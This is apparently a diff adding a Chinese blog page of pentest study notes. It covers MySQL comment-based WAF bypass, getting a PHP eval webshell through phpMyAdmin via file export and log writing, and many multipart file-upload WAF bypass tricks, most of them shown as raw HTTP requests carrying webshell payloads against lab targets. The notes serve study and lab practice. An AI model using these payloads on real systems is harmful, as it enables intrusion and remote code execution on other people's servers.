+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如MySQL服务器可以在以下语句中识别STRAIGHT_JOIN关键字,而其他服务器则不能：</span><br><span class="line">SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...</span><br><span class="line">如果在!后面添加版本号,则仅当MySQL版本大于或者等于指定的版本号时,才会执行注释中的语法。例如,以下注释中的关键字KEY_BLOCK_SIZE仅由MySQL 5.1.10或者更高版本的服务器执行：</span><br><span class="line">CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024*/</span><br><span class="line">/*! */类型的注释,内部语句会被执行</span><br><span class="line">select bbb from table1 where aaa=&#x27;&#x27; union /*! select database()*/;</span><br><span class="line">可以用来绕过一些WAF,或者是绕过空格</span><br><span class="line">但是,不能将关键词用注释分开,例如下面的语句是不可执行的（或者说只能在某些较老版本执行）</span><br><span class="line">select bbb from table1 where balabala=&#x27;&#x27; union se/*!lect database()*/;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/229300.html">https://www.freebuf.com/vuls/229300.html</a></p>
+<h1 id="SQL注入过滤逗号如何处理"><a href="#SQL注入过滤逗号如何处理" class="headerlink" title="SQL注入过滤逗号如何处理"></a>SQL注入过滤逗号如何处理</h1><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d10785d22db2">https://www.jianshu.com/p/d10785d22db2</a></p>
+<h1 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43348375/article/details/123909559?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-123909559-blog-122846028.pc_relevant_blogantidownloadv1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">12种报错注入+万能语句_董呆呆的博客-CSDN博客_报错注入语句</a></p>
+<h1 id="phpmyadmin如何拿shell"><a href="#phpmyadmin如何拿shell" class="headerlink" title="phpmyadmin如何拿shell?"></a>phpmyadmin如何拿shell?</h1><h2 id="数据库文件导入导出"><a href="#数据库文件导入导出" class="headerlink" title="数据库文件导入导出"></a>数据库文件导入导出</h2><p><strong>条件</strong></p>
+<ol>
+<li>数据库root权限</li>
+<li>数据库字段secure_file_priv没有具体的值</li>
+<li>获取网站的绝对路径</li>
+</ol>
+<p>先查看有没有写文件的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%secure_file_priv%&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php @eval(@_POST[zf]);?&gt;&quot; into outfile &quot;D:/Download/zf.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库全局日志写入"><a href="#数据库全局日志写入" class="headerlink" title="数据库全局日志写入"></a>数据库全局日志写入</h2><p><strong>条件</strong></p>
+<ol>
+<li>数据库root权限</li>
+<li>获取网站的绝对路径</li>
+</ol>
+<p>查看是否开启了全局日志以及全局日志的存放位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>修改或者设置全局日志的保存目录为网站的web目录,并且日志保存为php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=on;</span><br><span class="line">set global general_log_file=&quot;C:\\phpStudy\\WWW\\test.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>设置开启日志以及日志存储位置,这里日志存储位置为站点的根目录,执行命令写入日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库慢查询日志写入"><a href="#数据库慢查询日志写入" class="headerlink" title="数据库慢查询日志写入"></a>数据库慢查询日志写入</h2><p>慢日志查询 记录所有执行时间超过字段long_query_time规定时间的所有查询或者不使用索引的查询,默认情况下慢查询日志为关闭,long_query_time值为10秒</p>
+<p><strong>条件</strong></p>
+<ol>
+<li>数据库root权限</li>
+<li>获取网站的绝对路径</li>
+</ol>
+<p>查询相关配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow%&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global slow_query_log=on;</span><br></pre></td></tr></table></figure>
+
+<p>写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[shell]);?&gt;&#x27; or sleep(10); </span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><p><a target="_blank" rel="noopener" href="https://chowdera.com/2022/01/202201020402437761.html">https://chowdera.com/2022/01/202201020402437761.html</a></p>
+<h1 id="文件上传漏洞原理-绕waf"><a href="#文件上传漏洞原理-绕waf" class="headerlink" title="文件上传漏洞原理,绕waf"></a>文件上传漏洞原理,绕waf</h1><h2 id="http上传数据包"><a href="#http上传数据包" class="headerlink" title="http上传数据包"></a>http上传数据包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: sec</span><br><span class="line">Content-Length: 333</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://sec</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://sec/upload-labs/Pass-01/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: pass=01</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;.htaccess.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ--</span><br></pre></td></tr></table></figure>
+
+<p>这是一个完整的上传文件的数据包.这里在前段页面需要指定 Content-Type: multipart&#x2F;form-data; 才能正常上传文件.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /upload-labs/Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: sec</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;.htaccess.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryie9Mv0dt18E6H6MQ--</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>multipart&#x2F;form-data : 表示该请求时一个上传文件请求</li>
+<li>存在boundary字符串 : 作用为分隔符,以区分post数据</li>
+<li>Content-Disposition : 响应标头是指示内容是否预期在浏览器中内联显示的标题</li>
+<li>name : 包含改字段的内容引用的html字段的名称</li>
+<li>filename : 后面一个是一个包含传输文件的原始名称的字符串</li>
+<li>boundary的值就是Content-Type的值在最前面加了两个–,除了最后表示结束的boundary,在最后结束的boundary最后默认会多出两个–(当最后一行的boundary删掉也能上传成功)</li>
+</ul>
+<h2 id="文件上传在数据包中可以修改的地方"><a href="#文件上传在数据包中可以修改的地方" class="headerlink" title="文件上传在数据包中可以修改的地方"></a>文件上传在数据包中可以修改的地方</h2><ul>
+<li>Content-Disposition 一般可以更改 name 表单参数值.</li>
+<li>不能更改filename :文件名</li>
+<li>可以更改Content-Type:文件MIME</li>
+<li>视情况更改boundary:内容划分,可以更改</li>
+</ul>
+<h2 id="waf如何拦截恶意文件"><a href="#waf如何拦截恶意文件" class="headerlink" title="waf如何拦截恶意文件"></a>waf如何拦截恶意文件</h2><ul>
+<li>文件名:解析文件名,判断是否在黑名单内</li>
+<li>文件内容:解析文件内容,判断是否为webshell</li>
+<li>文件目录权限:这个由主机waf实现</li>
+</ul>
+<ol>
+<li>获取Request Header中Content-Type的boundary值</li>
+<li>根据boundary值,解析post数据,获取文件名</li>
+<li>判断文件名是否在拦截黑名单&#x2F;白名单之外</li>
+</ol>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="字符变异"><a href="#字符变异" class="headerlink" title="字符变异"></a>字符变异</h3><h4 id="引号变换"><a href="#引号变换" class="headerlink" title="引号变换"></a>引号变换</h4><p>头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: &quot;form-data&quot;; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br><span class="line">Content-Disposition: &#x27;form-data&#x27;; name=&quot;file_x&quot;; filename=&#x27;xx.php&#x27;</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&#x27;xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.php;</span><br></pre></td></tr></table></figure>
+
+<h4 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a>大小写变换</h4><p>对关键字符进行大小写转换 Content-Disposition  name  filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition</p>
+<h4 id="添加换行符"><a href="#添加换行符" class="headerlink" title="添加换行符"></a>添加换行符</h4><p>字符值与等号之间可以加入换行符,依然可以正常上传,如使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: &quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: &quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php</span><br><span class="line">Content-Disposition: &quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]&quot;xx.php&quot;[0x09]</span><br><span class="line">Content-Disposition: &quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]xx.php</span><br><span class="line">Content-Disposition: &quot;form-data&quot;; name=&quot;file_x&quot;; filename=[0x09]xx.php[0x09];</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607183231191.png" alt="image-20220607183231191"></p>
+<h4 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a>多个分号</h4><p>文件解析时,可能因为分号解析不到文件名,导致绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h4><p>在post中的内容中使用多个等号对文件上传没有影响</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name==&quot;file_x&quot;; filename====&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="变换Content-Disposition的值"><a href="#变换Content-Disposition的值" class="headerlink" title="变换Content-Disposition的值"></a>变换Content-Disposition的值</h4><p>在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: fOrM-DaTA; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-da+ta; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: fo    r m-dat a; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-dataxx; name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: name=&quot;file_x&quot;; filename=&quot;xx.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="畸形的boundary头部"><a href="#畸形的boundary头部" class="headerlink" title="畸形的boundary头部"></a>畸形的boundary头部</h4><p>boundary可以变换为如下形式,且不影响上传</p>
+<p><strong>multipart&#x2F;form-data大小写变换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>
+
+<p><strong>multipart&#x2F;form-data与boundary之间可以使用空格分割,且中间可以插入任何值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>
+
+<p><strong>multipart&#x2F;form-data与boundary之间可以使用逗号分割,且中间可以插入任何值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data,a\|/?!@#$%^(),boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>
+
+<p><strong>boundary之前可以直接加入任何值(php可行)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data;bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br><span class="line">Content-Type: multipart/form-data,bypass&amp;123**&#123;|&#125;boundary=----WebKitFormBoundarye111</span><br></pre></td></tr></table></figure>
+
+<p><strong>boundary末尾可以使用逗号或者分号隔开插入任何值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc</span><br></pre></td></tr></table></figure>
+
+<h3 id="顺序颠倒"><a href="#顺序颠倒" class="headerlink" title="顺序颠倒"></a>顺序颠倒</h3><h4 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换name和filename的顺序</h4><p>因为规定了Content-Disposition必须在最前面,所以只能交换name和filename的顺序.有的waf可能会匹配name在前面,filename在后面,可以导致绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=&quot;file_x&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="交换Content-Disposition和Content-Type的顺序"><a href="#交换Content-Disposition和Content-Type的顺序" class="headerlink" title="交换Content-Disposition和Content-Type的顺序"></a>交换Content-Disposition和Content-Type的顺序</h4><p>Content-Disposition和Content-Type也是能够交换顺序的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/png</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="交换不同boundary内容的顺序"><a href="#交换不同boundary内容的顺序" class="headerlink" title="交换不同boundary内容的顺序"></a>交换不同boundary内容的顺序</h4><p>不同boundary内容也能够交换,且不影响文件上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+<h3 id="boundary内容重复"><a href="#boundary内容重复" class="headerlink" title="boundary内容重复"></a>boundary内容重复</h3><p>最后上传的文件是shell.php而非shell.jpg,但是如果取的文件名时只取了第一个就会被Bypass</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br></pre></td></tr></table></figure>
+
+<p>下面这样也是可以正常上传的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA;123</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundarymeEzpUTMsmOfjwAA--</span><br></pre></td></tr></table></figure>
+
+<h3 id="filename重复"><a href="#filename重复" class="headerlink" title="filename重复"></a>filename重复</h3><p>最终上传成功的文件名是shell.php。但是由于解析文件名时,会解析到第一个。正则默认都会匹配到第一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.jpg&quot;; filename=&quot;shell.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="name与filename之间插入垃圾数据"><a href="#name与filename之间插入垃圾数据" class="headerlink" title="name与filename之间插入垃圾数据"></a>name与filename之间插入垃圾数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Pass-02/index.php HTTP/1.1</span><br><span class="line">Host: hackrock.com:813</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; </span><br><span class="line">filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span><br></pre></td></tr></table></figure>
+
+<h4 id="boundary字符串中加入垃圾数据"><a href="#boundary字符串中加入垃圾数据" class="headerlink" title="boundary字符串中加入垃圾数据"></a>boundary字符串中加入垃圾数据</h4><p>boundray字符串的值可以为任何数据（有一定的长度限制）,当长度达到WAF无法处理时,而Web服务器又能够处理,那么就可以绕过WAF上传文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Pass-01/index.php HTTP/1.1</span><br><span class="line">Host: hackrock.com:813</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;;filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--</span><br></pre></td></tr></table></figure>
+
+<h4 id="boundray末尾插入垃圾数据"><a href="#boundray末尾插入垃圾数据" class="headerlink" title="boundray末尾插入垃圾数据"></a>boundray末尾插入垃圾数据</h4><p>刚才讲到过boundary末尾可以插入任何数据,那么就可以在boundary字符串末尾加入大量垃圾数据</p>
